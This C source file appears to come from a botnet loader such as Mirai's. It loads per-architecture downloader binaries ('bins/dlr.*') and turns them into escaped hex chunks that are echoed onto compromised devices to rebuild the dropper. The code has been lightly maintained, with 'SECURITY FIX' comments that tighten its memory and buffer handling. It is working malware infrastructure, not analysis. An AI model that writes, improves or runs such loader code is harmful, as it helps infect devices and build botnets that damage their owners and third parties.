#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <glob.h>
#include "headers/includes.h"
#include "headers/binary.h"

static int bin_list_len = 0;
static struct binary **bin_list = NULL;

BOOL binary_init(void)
{
    glob_t pglob;
    int i;

    if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        printf("Failed to load from bins folder!\n");
        return FALSE;
    }

    for (i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];
        struct binary *bin;
        struct binary **tmp;

        tmp = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
        if (tmp == NULL)
        {
            printf("Failed to allocate memory for binary list\n");
            // SECURITY FIX: Free previously allocated binaries to prevent memory leak
            for (int j = 0; j < bin_list_len; j++) {
                if (bin_list[j]) {
                    if (bin_list[j]->hex_payloads) {
                        for (int k = 0; k < bin_list[j]->hex_payloads_len; k++) {
                            free(bin_list[j]->hex_payloads[k]);
                        }
                        free(bin_list[j]->hex_payloads);
                    }
                    free(bin_list[j]);
                }
            }
            free(bin_list);
            globfree(&pglob);
            return FALSE;
        }
        bin_list = tmp;
        
        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
        if (bin_list[bin_list_len] == NULL)
        {
            printf("Failed to allocate memory for binary\n");
            // SECURITY FIX: Free previously allocated binaries to prevent memory leak
            for (int j = 0; j < bin_list_len; j++) {
                if (bin_list[j]) {
                    if (bin_list[j]->hex_payloads) {
                        for (int k = 0; k < bin_list[j]->hex_payloads_len; k++) {
                            free(bin_list[j]->hex_payloads[k]);
                        }
                        free(bin_list[j]->hex_payloads);
                    }
                    free(bin_list[j]);
                }
            }
            free(bin_list);
            globfree(&pglob);
            return FALSE;
        }
        bin = bin_list[bin_list_len++];

#ifdef DEBUG
        printf("(%d/%d) %s is loading...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
#endif
        strncpy(file_name, pglob.gl_pathv[i], sizeof(file_name) - 1);
        file_name[sizeof(file_name) - 1] = '\0';
        strtok(file_name, ".");
        char *arch = strtok(NULL, ".");
        if (arch != NULL) {
            strncpy(bin->arch, arch, sizeof(bin->arch) - 1);
            bin->arch[sizeof(bin->arch) - 1] = '\0';
        }
        load(bin, pglob.gl_pathv[i]);
    }

    globfree(&pglob);
    return TRUE;
}

struct binary *binary_get_by_arch(char *arch)
{
    int i;

    for (i = 0; i < bin_list_len; i++)
    {
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i];
    }

    return NULL;
}

static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];
    int n;

    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("Failed to open %s for parsing\n", fname);
        return FALSE;
    }

    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;
        char **tmp;
        int i;

        tmp = realloc(bin->hex_payloads, (bin->hex_payloads_len + 1) * sizeof (char *));
        if (tmp == NULL)
        {
            printf("Failed to allocate memory for hex payloads\n");
            fclose(file);
            return FALSE;
        }
        bin->hex_payloads = tmp;
        
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
        if (bin->hex_payloads[bin->hex_payloads_len] == NULL)
        {
            printf("Failed to allocate memory for payload data\n");
            fclose(file);
            return FALSE;
        }
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        for (i = 0; i < n; i++) {
            size_t remaining = (bin->hex_payloads[bin->hex_payloads_len - 1] + (4 * n) + 8) - ptr;
            int written = snprintf(ptr, remaining, "\\x%02x", (uint8_t)rdbuf[i]);
            if (written > 0 && written < remaining) {
                ptr += written;
            } else {
                printf("Buffer overflow prevented in hex payload generation\n");
                fclose(file);
                return FALSE;
            }
        }
    }

    fclose(file);
    return TRUE;
}
